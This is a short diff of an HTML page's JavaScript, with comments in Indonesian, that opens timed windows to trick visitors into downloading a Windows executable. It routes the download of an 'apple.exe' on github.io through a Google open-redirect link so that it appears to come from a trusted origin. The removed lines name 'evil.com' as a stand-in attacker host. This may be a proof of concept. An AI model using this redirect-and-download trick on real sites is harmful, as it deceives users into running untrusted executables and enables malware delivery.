@@ -24,16 +24,16 @@ function a() {
 
     // Step 2: redirect ke example.com (trusted-looking page)
     setTimeout(function () {
-        window.open('http://evil.com', 'x');
+        window.open('https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe', 'blank');
     }, 1);
 
     // Step 3: trigger download dari origin asli
     setTimeout(function () {
         window.open(
-            'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe',
+            'https://www.google.com',
             '_blank'
         );
-    }, 4000);
+    }, 2000);
 }
 </script>
 
@@ -48,6 +48,7 @@ function a() {
 
 </body>
 </html>
+
 
 
 
